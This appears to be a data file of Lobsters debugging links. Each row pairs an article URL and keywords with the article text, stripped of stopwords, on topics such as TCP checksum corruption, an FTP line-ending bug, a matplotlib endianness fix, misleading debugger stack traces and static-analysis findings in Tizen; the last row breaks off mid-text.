417,Lobsters,debugging,Debugging,The mystery of the hanging S3 downloads,https://www.snellman.net/blog/archive/2017-07-20-s3-mystery/,mystery hanging downloads,packet capture tcp timestamps think debuggability network protocol important fixed freebsd month ago conclusion footnote,coworker experiencing strange problem internet connection home large downloads site worked fine exception downloads amazon would get good speed stall completely second restart stall eventually hang completely problem seemed specific downloads generic aws vms ok could going nt problem isp anything south connection site working problem isp amazon would problem aws also seems unlikely would trivially reproducible problem causing large downloads hang like minor use case service problem eg viewing netflix one might suspect kind targeted traffic shaping isp throttling forcibly closing connection aws general silly talk normal troubleshooting tip like reducing mtu nt help either sounded like fascinating networking whodunit could nt resist butting hearing grapevine packet capture first step debugging pretty much networking problem getting packet capture many point network possible case one capture point client machine problem could reproduced anything obviously taking capture option access device elsewhere traffic path superficial check ack stream showed following pattern traffic would humming along nicely sequence number see already downloaded first second client server flag ack client server flag ack client server flag ack single packet loss occurs tell sack block byte payload missing almost certainly single packet client server flag ack option sack single packet loss data continues delivered problem next get delivered missing data never arrives client server flag ack option sack client server flag ack option sack fact acks sent second even done one byte packet like expected two byte packet one byte one also rttsized delay first second packet client server flag ack option sack client server flag ack option sack client server flag ack connection continues merrily along exact thing happens second later tell clearly actual server would retransmitting lost packet much quickly second delay also would repacketizing byte packet three piece instead must happening retransmitted copy getting lost second rfc path mtu probing kick smaller packet get retransmitted reason retransmission make make sender believe path mtu reduced start sending smaller packet suggests something dodgy going mtus mentioned beginning reducing mtu help also suggests mechanism connection eventually hang completely rather alternating stalling recovering limit far ms reduced nothing else segment need least one byte payload practice operating system much higher limit ms something byte range typical even packet minimum size nt making server ca nt react sending smaller packet information ack stream exhausted time look packet direction know actually see earlier retransmissions client beautiful exponential backoff packet lost network silently rejected client reason server client flag seq ack length server client flag seq ack length server client flag seq ack length server client flag seq ack length server client flag seq ack length client server flag ack win option sack server client flag seq ack length server client flag seq ack length client server flag ack option sack really two reason would happen ip tcp checksum could wrong could wrong packet six time row crazy talk expected packet corruption rate like one million alternatively packet large damn know problem matter well case matching common pattern let look checksum rule server client flag cksum incorrect seq ack length server client flag cksum incorrect seq ack length server client flag cksum incorrect seq ack length oh every single copy packet checksum instead expected checksum checksum often real error artifact checksum offload packet captured software checksum computed hardware case packet receiving rather transmitting get crazier look next instance problem second later server client flag cksum incorrect seq ack length server client flag cksum incorrect seq ack length server client flag cksum incorrect seq ack length exact problem way problem appearing specifically tcp checksum analysis capture verified systematic problem coincidence packet expected checksum would always checksum replaced packet expected checksum would work fine explains path mtu probing temporarily fix problem repacketized segment different checksum make unharmed tcp timestamps problem internal causing specific kind packet corruption fast turn tcp implementation would work around kind corruption accident reason tcp timestamps nt need actually know much tcp timestamps understand story looking excuse rant tcp timestamps every tcp packet contain tcp option two extra value one sender latest timestamp echo latest timestamp sender received party example client sending timestamp server echoing back client server flag ack option t val ecr server client flag p seq ack option t val ecr tcp timestamps added tcp early two reason neither compelling retrospect reason number one paw protection wrappedaround sequencenumbers idea fast connection might require huge tcp window size minor packet reorderingduplication might cause old packet interpreted new packet due bit sequence number wrapped around nt think world ever really arrived paw irrelevant practically tcp use case original reason timestamps enable tcp sender measure rtts presence packet loss also done tcp selective acks feature much useful general thus widely deployed lot sooner despite standardized later exchange dubious benefit every tcp packet data segment pure control packet bloated byte contrast something like selective acks packet nt grow size pay selective acks packet lost reordered think debuggability network protocol important tcp get basically everything need source tcp timestamps high fixed cost give little additional power tcp timestamps suck much everyone use nt know sure anyone else reason ended implementing purely due interoperability issue freebsd tcp stack basically freebsd us small static receive window connection without tcp timestamps tcp timestamps scale receive window necessary connection even bit latency needed tcp timestamps avoid receive window becoming bottleneck fixed freebsd month ago yay performance freebsd client nt big deal long connection work know else us freebsdderived tcp stack apple come mobile network performance io device important get anyone care large transfer io o x client must use tcp timestamps matter distasteful find feature juho ask well one rare service disable timestamps actually make big difference case timestamps retransmitted copy packet would use different timestamp value part tcp header change odds checksum change well even packet lost due magic checksum least retransmissions make promptly check theory asked test tcp timestamps disabled client immediately large downloads anywhere even isp speedtest server started hanging success conclusion information suggested coworker call isp report problem smarter ran one test switching cable modem router mode bridging mode bam problem gone retrospect make sense router mode cable modem need update checksum packet pas device bridging mode nat checksum update needed dodgy cable modem caused downloads fail one service one service seen many kind packet corruption never anything absurdly specific footnote
418,Lobsters,debugging,Debugging,13 hours debugging a segmentation fault in .NET Core on Raspberry Pi due to FTP,https://www.hanselman.com/blog/13HoursDebuggingASegmentationFaultInNETCoreOnRaspberryPiAndTheSolutionWas.aspx,hour debugging segmentation fault net core raspberry pi due ftp,note net core aspnet running raspberry pi preview build net core command line sdk cli got http wwwraspberrypiorgdownloads etcherio filezilla ldsonohwcap warning corrupted file raspbian jesse winscp cr gone binary file treat file without extension ascii file sponsor thanks redgate learn hosting,debugging satisfying special kind hell really live understand deep never know done finally escape almost always doh moment spent entire day debugging issue solution ended checkbox note get third way blog post already figured well poop lunch needed wanted use raspberry pi tech talk tomorrow conference going show net core aspnet running raspberry pi figured start hello world hard could write build net app window mac publish raspberry pi using preview build net core command line sdk cli got c raspberrypi dotnet new consolec raspberrypi dotnet runhello world c raspberrypi dotnet publish r linuxarmmicrosoft build engine version net core c c notice simplified publish get folder linuxarm example could also publish etc want take file publish folder folder move raspberry pi selfcontained application target arm linux prerequisite need grabbed minisd card headed http wwwraspberrypiorgdownloads downloaded latest raspbian image used etcherio lovely image burner window mac linux wrote image sd card booted got ready install prereqs min point setting raspberry pi raspberry pi smooth day prereqs net core ubuntu debianraspbian install terminal natchsudo aptget install libicudev libssldev also added ftp server ran vncserver way talk raspberry pi yes could also ssh spare monitor monitor plus vnc nt see needsudo aptget pureftpdvncserver fire filezilla preferred ftp client ftp publish output folder dotnet publish put file folder desktop terminal ipi raspberrypi desktophelloworld chmod x raspberrypi whatever name published exe name source folderproject extension selfcontained published app net core runtime stuff folder apppi raspberrypi desktophelloworld raspberrypi segmentation fault crash instant pause crash showed soon pressed enter shoot ran strace raspberrypi got output figured maybe missed one prerequisite library needed see one aptget see ldsonohwcap error historical debianism warning fatal used able read straces year ago much like spanish skill good chipotle see getting started loading library seeking around checking file status mapping file memory setting memory protection fall apart perhaps tried something inappropriate memory got protected dereferencing null pointer maybe read already know going happen run gdb pi raspberrypi desktopwtfisthiscrap gdb raspberrypi gnu gdb raspbian c free software foundation incthis gdb configured armlinuxgnueabihf executable format file truncated gdb ok sick file called peter marcu net team chatted got working compared note using raspberry pi pi ok try minute later new sd card new burn new boot prereqs build ftp run result segfault weird maybe corruption thread corrupted file raspbian jesse version ok try build raspbian week minute later burn another sd card new boot prereqs build ftp run result segfault work peter machine weird maybe bad nugetconfig bad daily net build work peter machine ok try ubuntu mate raspberry pi totally different o minute later burn another sd card new boot prereqs build ftp run result segfault common thread ok try another window machine result segfault call peter back figure got ta prereqs strace nt show even trying load interesting library fail fast ok let get serious raspberry pi check kind sd card sandisk ok use sandisk disk corruption make sense level o booted burn used used etcher fine bite minute later burn another sd card new boot prereqs build ftp run result segfault sends build helloworld ftp pi result segfault peter freaking deeply unhappy considering quitting job kid going sleep late ask ftping say winscp use filezilla ok try winscp winscp new session dialog start say wait using sftp ftp peter say using sftp turn ssh raspberry pi sftp winscp copy hello world freaking work immediately make folder called good folder called bad copy filezilla bad winscp good run compare maybe part net core got corrupted maybe supporting native library pi raspberrypi desktop diff brief r helloworld helloworldwrongfiles differ wait executable different one byte bad one byte time visual compare point saw immediately cr lf know old written printer driver printer carriage line feed know likely transferred file unix window thrice perhaps ftp git cr gone binary file went straight setting filezilla see treat file without extension ascii file default filezilla change file chilling minding business ascii randomly strip carriage return could go wrong nt even look cr lf pair look cr strip classy retrospect used known nt even switch sftp switch ftp program different default bugissue whatever burned whole monday never burn another monday dear reader seen fail fast fail often friend experience matter mean failed lot past super useful remember bug next time happens burn minute rather day go forth fail lot love oh ftp suck sponsor thanks redgate third team version control database connect database version control system sql source control find made change learn hosting
419,Lobsters,debugging,Debugging,"The Tale Of The Two-Day, One-Character Patch",https://www.happyassassin.net/2017/01/11/the-tale-of-the-two-day-one-character-patch/,tale twoday onecharacter patch,pythondeap official build recent mailing list discussion build log pythonmatplotlib github function backtrace thing extension module patrick uiterwijk read doc web search ftulong handy definition one character patch build pythondeap successfully several similar issue two,feeling like writing long explanation small change folk told enjoy attempt detail entire stepbystep process debugging somewhat complex problem sit back folk enjoy tale twoday onecharacter patch recently landed python fedora rawhide python version bump like requires pythondependent package distribution rebuilt usually happens several package failed rebuild successfully among work helping work list failed package fixing two day ago reached pythondeap usual first simply tried mock build package sometimes turn already fixed whatever previously caused build fail simply retrying make work nt case time build failed due build dependency installable case turned depends pandocciteproc nt installable new ghc build done without rebuilds set pandocrelated package must rebuilt ghc bump rebuilt pandoc ghcaesonpretty updated version needed build updated pandocciteproc committed built finally pandocciteproc done could successful scratch build pythondeap tweaked package bit enable test suite another thing package fixing build possible fired official build may notice look bit odd build different arch succeeded green overall state failed going well click show result see builderror following noarch package built differently different architecture rpmdiff output error open package index using permission denied error open package database varlibrpm error open package database varlibrpm removed removed removed removed good example background knowledge valuable getting step step kind debuggingtroubleshooting process sort combination logic knowledge perseverance always try logical methodical start wo nt awful lot knowledge need lot perseverance hopefully longer go knowledge pick thus le perseverance need case error actually fairly helpful also know bit package help remembered recent mailing list discussion fedora allows arched package noarch subpackages pythondeap set main package arched pythondeapdocs subpackage noarch concerned package recalled recent mailing list discussion built differently different architecture error discussed thread failing koji check specific kind package perarch build succeed individually koji take noarch subpackage arch compare koji consider error fail build point noarch package content arch nt matter arch build take noarch subpackage come different different arch something clearly left problem figuring arch different nice koji message actually told u started looking build log arch searching cmaplotting actually another important thing one important approach toolbox kind work searching significantlooking text string might grep might web search probably wind lot remember good searching technique try find unusual string search one result strongly correlated problem quickly told problematic arch removed file present build present build arch started looking deeply build log search cmaplotting file see first result warning exception occurred plotting cmaplotting sound bad long python traceback text starting traceback recent call last kind python thing crashing build quickly compare build log arch nt see thing traceback build log especially since show right build process generating file know problem cmaplotting file remember pretty sure culprit pretty big scary traceback learn thing quite easily one important see quite easily going wrong look end traceback see last call involve file mean dealing python module called matplotlib quite easily associate package pythonmatplotlib next suspect look bit traceback get bit general context going though turn important case sometimes though case see doc buildhtml running sphinx background knowledge come handy happen know sphinx tool generating documentation nt already know quite easily able find good old web search going package build process trying generate pythondeap documentation process us matplotlib library something going wrong remember matplotlib try generate one particular set doc file next start trying figure actually going wrong matplotlib mentioned traceback pretty long partly matplotlib big complex fairly rare type python error infinite recursion see traceback end many many repetition line file line getglyph return selfgetglyph rm fontclass sym fontsize followed file line getglyph uniindex getunicodeindex sym math file line getunicodeindex symbol runtimeerror maximum recursion depth exceeded cmp recursion mean pretty simple mean function call common example might want trying walk directory tree pythony pseudocode might look bit like def readdirectory directory print directoryname entry directory entry file print entryname entry directory readdirectory entry deal directory nested directory function call danger somehow mess writing code like wind loop calling never escaping infinite recursion python nice language notice going bail certain number recursion happening know look matplotlib look let go take look matplotlib like everything else universe day github bad ecosystem health handy finding stuff let go look function backtrace well pretty long maybe bit intimidating interesting thing nt really need know function actually still nt know precisely according name returning glyph single visual representation specific character font actually return font unicode index glyph name glyph font size whether glyph italicized reason need concentrate question function getting recursion loop one arch others first let figure recursion actually triggered vital figuring next step chain line trigger loop one return selfgetglyph rm fontclass sym fontsize call kinda obvious author expect call succeed nt run logical path instead get success path return font uniindex symbolname fontsize slanted line end function thus break loop reason nt logic path lead u call initially recurses well three level conditionals foundsymbol selfcmfallback path else fontname regular isinstance self stixfonts return selfgetglyph rm fontclass sym fontsize get path foundsymbol set time reach first selfcmfallback set fontname given function called regular class instance function actually method part instance stixfonts class subclass nt worry getting bit technical point spend bit time looking last two condition ultimately turned significant important one first one foundsymbol point starting wonder problem failing find symbol first half function nt couple handy logical shortcut take turned rather useful first look whole logic flow foundsymbol variable see bit convoluted start function two different way set true selfusecmex block fallback foundsymbol block another block start foundsymbol get set back false another lookup done foundsymbol foundsymbol false font selfgetfont newfontname font none glyphindex fontgetcharindex uniindex glyphindex foundsymbol true first though nt know even hitting block failing find symbol earlier turn though easy tell earlier block foundsymbol try uniindex getunicodeindex sym math foundsymbol true except valueerror uniindex ord warn tex unicode mapping symencode ascii backslashreplace mathtextwarning basically nt find symbol code log warning see build log nt see warning know code initially succeed finding symbol get foundsymbol block foundsymbol true logically mean block problem occurs foundsymbol going block set back false look kind font substitution nt know nt care fails thing noticed poking code later warning remember infinite recursion happens fontname regular isinstance self stixfonts well happens case interesting fontname regular isinstance self stixfonts return selfgetglyph rm fontclass sym fontsize warn font glyph u x newfontname symencode ascii backslashreplace decode ascii uniindex mathtextwarning condition nt satisfied instead calling next thing function log warning occurred go see warning build log whaddayaknow four warning build log mathtextwarning font rm glyph mathtextwarning mathtextwarning substituting dummy symbol warn substituting dummy symbol mathtextwarning mathtextwarning font rm glyph mathtextwarning mathtextwarning font rm glyph mathtextwarning mathtextwarning font rm glyph mathtextwarning warning log arch really rather interesting make one possibility unlikely reach recursed call arch fails succeeds arch looking far likely problem rediscovery bit function foundsymbol block look symbol usually working arch failing looking logical flow function particularly happens different conditional branch actually able figure quite lot without knowing even caring function really point really focusing foundsymbol block lead u next suspect important bit block actually decides whether set foundsymbol true font selfgetfont newfontname font none glyphindex fontgetcharindex uniindex glyphindex foundsymbol true nt actually know whether failing selfgetfont nt find anything fontgetcharindex returned think played hunch getcharindex problem would nt difficult find editing code bit log message telling whether font none rerunning test suite anyhow wound looking getcharindex need go find could work backwards code figure font instance find boring far quicker grep damn code get various result call const char getcharindex n static pyobject self pyobject args pyobject kwds pyargparsetuple args k getcharindex ccode getcharindex pycfunction methvarargs point started mentally buckling python c glorious c note point probably halfdecent python coder point still pretty awful c may somewhat wrong anything say correction welcome buckled went look thing seen kind thing couple time squinting bit sideways could le see python call extension module basically python module written c c get done need create new builtin type speed case python project want work directly system shared library case freetype either nt python binding project nt want use reason code pretty much provides class working freetype font defines class called method getcharindex code back mathtextpy dealing font dealing instance using getcharindex method try find symbol fortunately getcharindex method actually simple enough even figure static pyobject self pyobject args pyobject kwds ftuint index ftulong ccode pyargparsetuple args getcharindex ccode return null index ftgetcharindex self x getface ccode return pylongfromlong index playing along home mega bonus point necessary information try figure bug want explain keep reading really awful lot calling ftgetcharindex couple args returning result rocket science fact seemed like good point start bit experimenting identify precise problem reduced problem small area stopped reading code started hacking see first tweaked relevant block mathtextpy log value feeding getting font selfgetfont newfontname font none glyphindex fontgetcharindex uniindex warn uniindex glyphindex uniindex glyphindex glyphindex foundsymbol true sidenote exactly print something console building running test vary quite bit depending codebase question usually look project already find message printed build run test copy thus case see code using warn function actually warningswarn know message appearing build log let copy ran test suite compared told python code passing uniindex value c code getting different result back got recorded uniindex value resulting glyphindex value always something larger sometimes next step pretty obvious log input output value c code index ftgetcharindex self x getface ccode printf ccode lu index un ccode index another sidenote one annoying thing particular issue able run test modification see happened first needed actual environment use awesome patrick uiterwijk fedora release engineering provided one built srcrpm pythonmatplotlib package ran mock build shelled mock environment give environment necessary build dependency source test prepared already copied necessary build install test command spec file simple purepython module usually pretty easy check source right regular environment virtualenv something something like matplotlib c extension module complex spec build code installs run test source directory code actually built installed used test wanted modify c part matplotlib edited source directory reran build install step ran test wanted modify python part edited directly buildroot location reran test ran test noticed several hundred failed exactly bug seen pythondeap package build infinite recursion problem several others failed due able find glyph without hitting recursion turned package maintainer disabled test fedora pythonmatplotlib broken since april anyway modified c code built used run test suite finally smoking gun running logged ccode value totally different value logged huge know previous logging difference value python code passed c code uniindex value logged python code knew problem lay c code took value python code point started figuring worked key line one pyargparsetuple args getcharindex ccode pyargparsetuple function c code using read value mathtextpy call uniindex call ccode one somehow messed let read doc one unusual example python doc usually awesome bit difficult thin description nt provide reference usually get really need read go back top page get much comprehensive explanation reading carefully whole page see pretty much going call basically mean args expected structure representing single python object number store c variable ccode tricky bit second arg getcharindex format string python page go lot helpful detail tell u pyargparsetuple use format string used tell function expected argument format string consists zero format unit format unit describes one python object usually single character parenthesized sequence format unit exception format unit parenthesized sequence normally corresponds single address argument function next get list format unit one integer unsigned int convert python integer c unsigned int without overflow checking might also notice list format unit include several converting python integer thing like signed int h short int become significant soon getcharindex bit threw minute explained character meaning format string may occur inside nested parenthesis list format unit end string colon used function name error message associated value exception pyargparsetuple raise case single format unit getcharindex name used error message call might produce know call saying python code call function take args called parse c structure stuff case expect single arg python integer want convert c unsigned integer store c variable ccode playing along home nt get earlier really able get hint read line c code go refresh memory architecture understood realized problem let read line c code ftulong ccode unlike python c c typed language mean variable must declared specific type unlike python variable nt declare explicitly change type time like variable declaration simply saying want variable called ccode type ftulong know anything c integer type know problem probably worked paragraph back nt good time learn several different type use storing integer c short int long possibly long long depends arch basically efficiency put small number short need store small number might efficient use short long theoretically use short compiler allocate le memory use int us le memory long us le long long practically speaking wind size platform basic idea type signed unsigned variant difference simple signed number negative unsigned one ca nt say int big enough let store different value signed int would let store number unsigned int would let store number look ccode declaration type ftulong ulong sound lot like unsigned long right yes cookie c code often declares alias standard c type like find freetype api documentation found cunning technique web search ftulong find u handy definition typedef unsigned long aaaaaaand herein lie bug whew last hopefully see ccode variable declared unsigned long telling pyargparsetuple convert python object store unsigned int unsigned long wait think seem work ok arch fail already know answer good go read something else rest concept called endianness might come across completely failed understand like many time really pretty simple least skate bit consider number fortytwo write numeral right least human day unless particularly hardy survivor fall rome something mean human bigendian littleendian write like bigendian mean significant element come first representation littleendian mean significant element come last arch fedora support except littleendian littleendian arch error nt actually cause problem even though used wrong format unit value wind correct bigendian arch however cause problem tell pyargparsetuple convert unsigned long store result variable declared unsigned int get completely different value multiplied reason involve getting technical understanding littleendian v bigendian actually get icky detail value really represented memory going skip since post already long enough nt really need understand completely certainly able spot problem like need know littleendian bigendian arch littleendian far prevalent day unusual lowlevel code weird bug bigendian arch something work fine arch one two check one fails bigendian keep careful eye kind integer type mismatch problem likely cause remained fix problem go one character patch diff git index static pyobject self pyobject args pyobj ftuint index ftulong ccode pyargparsetuple args getcharindex ccode pyargparsetuple args k getcharindex ccode return null something love onecharacter change fix several hundred test failure see simply change format unit unsigned int k format unit unsigned long bug solved applied change rebuilt code reran test suite observed several hundred error disappeared test suite test continued pas able send patch upstream apply fedora package package build went could finally build pythondeap successfully two day first tried bonus extra content even though fixed pythondeap problem never able leave well enough alone wound bugging still several hundred failure matplotlib test suite wound looking failure finding several similar issue got failure count two set problem domainspecific figure actually also happen bigendian issue people running matplotlib welcome seriously though suspect without fix might odd case noarch package documentation would suddenly get messed package happened get built builder
420,Lobsters,debugging,Debugging,debug-me - secure remote debugging,https://debug-me.branchable.com/,debugme secure remote debugging,put chain evidence server joey hess,debugging problem emailircbts slow tedious hard developer need see problem understand debugme aim make debugging fast fun easy letting developer access computer remotely immediately see interact problem making problem problem get fixed fast simon tatham put nutshell aim bug report enable programmer see program failing front debugme debugme session logged signed developer gnupg key producing chain evidence saw developer good reputation leveraged make debugme secure trust developer ship software computer trust debugme start debugme without option connect debugme server print url give developer get connected debugme show gnupg key signed let know known developer software computer developer good reputation proceed let type console debugme session session done debugme server email signed evidence developer session developer something bad proof trusted share world knowing case keep developer honest debugme free software created joey hess licensed term gnu agpl version greater
421,Lobsters,debugging,Debugging,When Debuggers Lie,https://tech.okcupid.com/when-debuggers-lie/,debugger lie,dwarf great resource displayed correctly dwarf spec developer okcupid hiring click learn,okcupid recently spent lot time trying debug application panic seemed like could nt possibly happen well turn panic happening thought triggered different code path actually debugger seemingly lied u call stack time panic however saying debugger lied u would le accurate saying compiler lied debugger figure happened let take look simplified version code caused issue include stdioh include stdlibh include stringh static int item static inline int getnonzeroitem sizet item printf requested item n abort return item static inline int getnonzerothree void return getnonzeroitem static inline int getnonzerofive void return getnonzeroitem int main void int int item getenv fill sizeof item sizeof item item else memset item sizeof item getenv foo item getnonzerothree else item getnonzerofive printf item dn item return key part code caused bug two inlined code path lead exact printabort code compiler combine together part code optimization optimization make impossible debugger determine code path led failure let try getting possible panic path run use clang example although confirmed equivalent behavior occurs gcc clang version clang version clang g inlinemerge inlinemergec inlinemerge requested item aborted core dumped inlinemerge requested item aborted core dumped first invocation test program panicked within getnonzerofive environment variable foo set second invocation panicked within getnonzerothree let take look resulting core dump see whether really case gdb inlinemerge corewithfoo gdb bt giraise sigsig giabort getnonzeroitem getnonzerothree main look correct environment variable foo set tried calling getnonzerothree panicked core file gdb inlinemerge corewithoutfoo gdb bt giraise sigsig giabort getnonzeroitem getnonzerothree main well ca nt right nt set foo program called getnonzerofive instead getnonzerothree happen let take look instruction compiler generated code everything got inlined look disassembly main objdump inlinemerge le main push rbp push rbx push rax bf mov edi fe ff ff callq getenv plt test rax rax je movaps rip movaps rip item movaps rip movaps rip movabs rax mov rip bb mov ebx bd mov ebp eb jmp xorps movaps rip movaps rip item movq rip ed xor ebp ebp db xor ebx ebx bf mov edi fe ff ff callq getenv plt test rax rax je db test ebx ebx jne eb jmp ed test ebp ebp eb mov ebp ebx je bf mov edi xor eax eax de mov ebx esi fe ff ff callq printf plt xor eax eax add rsp pop rbx pop rbp retq bf mov edi fe ff ff callq put plt fe ff ff callq abort plt nopl rax environment variable check determine function call take place instruction foo set execute instruction db test ebx ebx jne eb jmp otherwise execute ed test ebp ebp eb mov ebp ebx je earlier function assigned value item ebx ebp correspond possibility calling getnonzeroitem respectively check foo determines two value end using however important part two snippet jump address result zero going address bf mov edi fe ff ff callq put plt fe ff ff callq abort plt nopl rax instruction implement printing panicking code getnonzeroitem line inlining function getnonzerothree getnonzerofive compiler noticed block code duplicated two inlined function combined optimization let look instruction pointer main time panic value coredumps gdb frame main item getnonzerothree gdb px rip program executing block shared two inlined function execution reached point debugger know inlined code path led case might possible using dynamic analysis general problem extremely difficult impossible solve reliably gdb choose tell u executed getnonzerothree case nt choose getnonzerofive time instead let take look debug information compiler generated readelf debuginfo inlinemerge le abbrev number dwtagsubprogram dwatlowpc dwathighpc aa dwatname indirect string offset main ca abbrev number dwtaginlinedsubroutine cb dwatabstractorigin cf dwatranges dwatcallfile dwatcallline abbrev number dwtaginlinedsubroutine dwatabstractorigin ed dwatlowpc dwathighpc dwatcallfile fa dwatcallline dwarf debugging information check two great resource introduction dwarf representing main function inlined instance function getnonzerothree getnonzerofive respectively dwtaginlinedsubroutine block provide information instruction correspond inlined function debugger know one display backtrace let examine relevant instruction inlined function dwatranges attribute first inlined function block tell u instruction range covered inlined function defined another dwarf section called debugranges offset let take look readelf debugranges inlinemerge le offset begin end end list mean inlined function getnonzerothree cover two block instruction notice correspond exactly two block instruction looked check item logpanic block end importantly second block includes instruction pointer main time panic getnonzerofive dwarf attribute dwatlowpc dwathighpc tell u start end instruction range effectively shorthand version single row range table range getnonzerofive corresponds exactly block instruction implement item however notably include range representing logpanic block therefore debugger check inlined function relevant instruction pointer match getnonzerothree getnonzerofive happens regardless function actually called lead u point displayed correctly really nothing debugger case given debugging information available information indicates current instruction pointer within range getnonzerothree getnonzerofive debugger actually exactly right thing based information information could compiler provide instead enable debugger provide useful feedback developer optimization performed accurate information debugger could possibly provide case main could executing either inlined function getnonzerothree inlined function getnonzerofive ca nt say sure another alternative better status quo would omit ambiguous inlined function call altogether display call definitively happened based current state gdb already chain inlined call multiple possible execution path debugging information case made appear though execution path ambiguous compiler might indicated ambiguity including block debugging entry getnonzerofive well would allowed debugger choose either display approach described based cursory reading dwarf spec nt see anything disallowing overlapping instruction range concrete instance inlined function however allowed think best alternative would include overlapping range neither inlined instance would cause debugger display neither function stack trace approach would also require marking getnonzeroitem direct inlined call main ambiguous code block otherwise would omitted stack trace well omitting call altogether preferable potentially including incorrect call stack trace latter lead developer wrong debugging path case debugger told u two execution path could led panic would known explore possibility would quickly identified true root cause instead spent lot time debugging root cause never happened first place developer given current behavior compiler takeaway help developer situation first simply aware sort optimization possible stack trace misleading case part reason took u awhile debug issue assumed stack trace saw accurate knew variable value often optimized sometimes incorrect optimized build thought stack trace still reliable second takeaway error handling always provide information data factoring error instance error message program included index caused fault could debugged issue based error message alone would also clear indication stack trace incorrect code written faulty stack trace still consistent log output saw nt clear reason doubt stack trace additionally particular case making error message depend input data might prevented compiler performing optimization caused bug first place two failure case would shared much le code wo nt reliably case situation general expression takeaway writing error handling code always aim make easy possible distinguish multiple cause input issue okcupid hiring click learn
422,Lobsters,debugging,Debugging,27 000 errors in the Tizen operating system,https://www.viva64.com/en/b/0519/,error tizen operating system,pptx slideshare open letter tizen wikipedia article analysis tizen claim http buildtizenorgprojectshowtizen unified attention please analysis project developed samsung specialist note cwe typo condition code written left right error collection bug evil comparison function typo condition pointless comparison error copypaste method dangerous way using alloca function error nonexisting buffer used error le element array processed needed error called logic error sequence else error repeated assignment error dereference potentially null pointer error total usual practice tizen developer check memory allocated identical action error pointer dereferenced error terminal null condition always truefalse error confusion enum error part condition always truefalse error confusion type created destroyed object mistake incorrect using printflike function bug behavior null printf printing specifier checking pointer executed dereference error deleted private data error confusion memory allocation release error potentially uninitialized variable error code protected incorrect string selfmade declaration mathematical constant error dangerous arithmetic bug code nt look way work error loss high bit error security vulnerability mysqlmariadb offbyone error error insidious c language undeclared function used error collection example error real program taken account new operator unlike malloc return null error recommendation confusion integer double error writing readonly memory error access violation incorrect loop error potential memory leak realloc usage error memory leak error typo identical code block error dead code error incorrect initialization object error issue error tizenotherthingstxt intermediate total analysis thirdparty project used tizen typo condition written left right error dereference potentially null pointer error total function return random value error using freed memory error typo identical code block error condition always truefalse private data cleared error issue error tizenthirdpartyotherthingstxt intermediate total overall result summary table false positive error using pvsstudio detect fix error conclusion pvsstudio read codeanalysis,article demonstrate development large project static analysis useful completely necessary part development process article first one series post devoted ability use pvsstudio static analyzer improve quality reliability tizen operating system start checked small part code operating system noted warning pointing real error extrapolate result see team able detect fix error tizen using result conducted study made presentation demonstration samsung representative offer possible cooperation meeting postponed decided waste time transform material presentation article get coffee cooky long programmer thriller waiting u probably start link presentation pvsstudio ready improve code tizen operating system served basis article pptx slideshare however necessary watch presentation material covered detail topic presentation overlap open letter also speak offer cooperate tizen enough talking let get point first thing remind reader tizen operating system general tizen tizen operating system based linux kernel gnu c library implementing linux api work wide range device including smartphones tablet invehicle infotainment ivi device smart tv pc smart camera wearable computing smart watch developed managed corporation intel samsung support hardware platform processor arm architecture detailed information found wikipedia tizen platform show steady growth past several year despite abundance operating system mobile device wearable device market according report samsung growth mobile phone tizen operating system team tizen operating system seems attractive sense samsung interested reliability make effort improve quality code example samsung invested development specialized analyzer svace isp ra svace used main mean providing security system application software tizen platform quote taken article samsung invested million svace security solution analyze tizen apps part security measure samsung using svace technology security vulnerability critical error detector detect potential vulnerability error might exist source code application created tizen operating system o technology developed isp ra institute system programming russian academy science based moscow russia solution applied part tizen static analyzer tool included tizen sdk studio using tool perform static security analysis tizen apps native c c source code discover issue might tool help discover wide range issue compilation time dereference null pointer memory leak division zero double free etc pvsstudio team could miss chance check interesting open source project analysis tizen purpose presentation mentioned earlier demonstrate pvsstudio analyzer find lot error various type kind resume analyzer team want show samsung still reader may start doubting read resume article yes really worth reading lot interesting useful information first better learn people mistake rather secondly article perfectly show static analysis methodology must large size project colleague working large project claim write highquality code almost without error show article think creator tizen wanted bug get project thousand bug always would like remind static analysis used regularly single check tizen project useful course ineffective likely minor error affect capacity project obvious error already fixed mean example due user complaint mean static analysis nt really useful course great use already said onetime check efficient way use analyzer analyzer used regularly case lot error including critical one detected earliest stage earlier error detected le expensive correct believe pvsstudio detects error present code tizen project case regular use pvsstudio new code error prevented predict pvsstudio team detect fix error tizen project course could wrong manipulating result put analyzer best foot forward necessary pvsstudio powerful tool find many defect sense falsify result explain got figure course could check entire tizen project whole tizen project thirdparty library line c c code excluding comment decided choose randomly several dozen project tizen unified http buildtizenorgprojectshowtizen unified choosing project divided two group first group project written samsung employer comment beginning file sign copyright c samsung electronics co ltd right reserved second group thirdparty project used tizen project however many project really called thirdparty various patch example patch made library tizenonly prerotation enabled direct rendering set client side rotation set sfc directfbopt sfc clientsiderotation evglengine funcs nativewinprerotationset evglengine funcs nativewinprerotationset engdata err prerotation work somewhat relative division however precise accuracy really required general evaluation randomly chose project started reviewing analyzer log selecting warning worth taking look course bug quite innocent show extremely rarely example following code fail rarely mptr int realloc mptr newsize mptr return error memory leak occur possible allocate new memory fragment type error considered later yes probability memory leak extremely small mind real error need fixed took week choose warning mind point real error also noted large amount code fragment use preparation presentation article attention please article speak amount error number analyzer warning saying error mean code fragment require fixing view one developer looked presentation really think commented something like analyzer warning nt really achievement really much let emphasize talking real error research noting counting error analyzer warning analysis project developed samsung specialist randomly chosen following project quite big number project many small size let see type error managed detect note addition pvsstudio warning try classify bug found according cwe common weakness enumeration however trying find vulnerability providing cweid solely convenience reader used classification defect aim find many error possible determining extent error dangerous security point view go beyond research going long story suggest making first cup tea coffee need another one later beginning article typo condition code written left right error classic toplevel classic say firstly error detected diagnostic diagnostic effectively detects typo consequence inattentive copypaste extremely popular widespread type error definitely take look great collection bug open source project gathered thanks diagnostic secondly error le operator incorrect comparison two object also classic error occurs due fact nobody check simple function recently written interesting article topic evil comparison function kind mountain madness programmer code talking bool operator const tsegment const mstart othermstart return true mstart othermstart return mlen mlen return false error found pvsstudio warning identical subexpressions left right operator mlen mlen segmentorh software weakness type expression always false error object differ value mlen member compared incorrectly correct variant comparison return mlen othermlen similar error identical subexpressions safestrcmp btnstr settinggettext idsstbuttonok left right operator settingcommongeneralfuncc typo condition pointless comparison error static void pagefocuschangedcb void data int int focusunit int data focusunit null focusunit e focus page wrong return error found pvsstudio warning nonsensical comparison pointer appsviewcircleindicatorc software weakness type insufficient comparison comparison pointer meaningless indicates typo code understand indirection unary operator missing code dereference pointer correct code focusunit null focusunit code copied mistake result see bug function pagecountchangedcb static void 